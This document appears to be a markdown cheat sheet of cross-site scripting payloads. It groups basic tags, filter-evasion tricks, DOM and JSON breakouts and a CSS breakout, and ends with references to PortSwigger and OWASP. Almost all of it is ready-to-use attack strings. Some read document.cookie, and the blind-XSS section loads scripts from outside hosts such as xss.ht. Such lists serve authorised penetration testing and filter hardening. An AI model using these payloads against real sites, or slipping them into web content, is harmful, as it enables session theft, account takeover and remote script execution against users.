# Basic XSS Payloads

```
<script>alert(1)</script>
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<iframe src="javascript:alert(1)"></iframe>
<math><mi//xlink:href="data:x,<script>alert(1)</script>">
contentvisibilityautostatechange='alert(1)'
via invalid tag --
<22> foo="bar<h1>">test</22>
<22 foo="bar<img src=x onerror="alert()">test</22>
"-prompt(8)-"
";a=prompt,a()//
</scrip</script>t><img src =q onerror=prompt(8)>
javascript:alert(1)
```

# Bypassing Filters
```
<scr<script>ipt>alert(1)</scr</script>ipt>
<IMG SRC=JaVaScRiPt:alert(1)>
<svg><script xlink:href=data:,alert(1)></script></svg>
<svg><a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click</a></svg>
<details open ontoggle=confirm(1)>
onToggLe='let%20x=%60javascri%60%3Blet%20y=%60pt:aler%60%3Blet%20z=%60t()%60%3Blet%20a=x+y+z%3Blocation=a'> ==>  onToggLe='let x=`javascri`;let y=`pt:aler`;let z=`t()`;let a=x y z;location=a'>

```
# DOM XSS Payloads (Assume input is reflected into JS)
```
';alert(1);// 
";alert(1);// 
</script><script>alert(1)</script>
'+document.domain+' 
"><svg onload=confirm(document.cookie)>
```
# JSON/JS Injection Payloads (Context: inside a JSON/JS response)
```
"};alert(1);//
');alert(1);//
",";alert(1);//
```
# XSS in CSS
```
<!DOCTYPE html>
<html>
<head>
<style>
div  {
    background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
    background-color: #cccccc;
}
</style>
</head>
  <body>
    <div>lol</div>
  </body>
</html>
```
# Blind XSS
- You can use your own local host to get an alert pop OR
  use https://xsshunter.com/app
```
"><script src="https://js.rip/<custom.name>"></script>
"><script src=//<custom.subdomain>.xss.ht></script>
<script>$.getScript("//<custom.subdomain>.xss.ht")</script>
```
if there is **encodeurlcomponent**() function:

it escapes all the chars but not 
```A–Z a–z 0–9 - _ . ! ~ * ' ( )```

References:

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html



